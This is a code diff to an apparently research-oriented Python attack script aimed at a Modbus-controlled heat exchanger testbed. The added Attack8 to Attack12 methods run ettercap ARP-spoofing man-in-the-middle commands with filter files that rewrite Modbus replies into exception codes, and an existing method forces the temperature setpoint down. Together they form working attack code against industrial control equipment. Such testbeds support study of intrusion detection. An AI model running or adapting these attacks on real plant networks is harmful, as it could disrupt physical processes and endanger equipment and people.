@@ -16,6 +16,7 @@ import pickle
 from threading import Thread
 from HeatExchangerModbusUtility import ModbusUtility
 from HeatExchangerAttackUtility import AttackTask
+import os
 
 MODBUS_PKT_SIZE=55
 PKT_PER_SEC = 1000
@@ -27,6 +28,11 @@ class attack:
         self.ThreadDict = {}
 
         self.AttackDict = {
+	     8: self.Attack8,
+             9: self.Attack9,
+            10: self.Attack10,
+            11: self.Attack11,
+            12: self.Attack12,
             18: self.Attack18,
             19: self.Attack19,
             20: self.Attack20,
@@ -72,6 +78,26 @@ class attack:
         for AttackNumber in list( self.ThreadDict.keys() ):
             self.StopAttack( AttackNumber )
 
+    def Attack8( self ):
+        # #8 -- Replace function code with 0x80 and add 0x01 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack8EC1.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def Attack9( self ):
+        # #9 -- Replace function code with 0x80 and add 0x02 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack9EC2.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def Attack10( self ):
+        # #10 -- Replace function code with 0x80 and add 0x03 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack10EC3.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def Attack11( self ):
+        # #11 -- Replace function code with 0x80 and add 0x04 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack11EC4.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def Attack12( self ):
+        # #12 -- Replace function code with 0x80 and add 0x05 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack12EC5.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
     def Attack18( self ):
         # #18 -- Set the value of setpoint below 20C
         self.he.WriteRegister( "Setpoint", 10 )
@@ -111,5 +137,5 @@ class attack:
 if __name__=="__main__":
     attacker = attack( "192.168.56.104", "502" )
     attacker.he.PrintAllRegisters()
-    attacker.RunAttack( 19 )
+    attacker.RunAttack( 12 )
     attacker.StopAllAttacks()
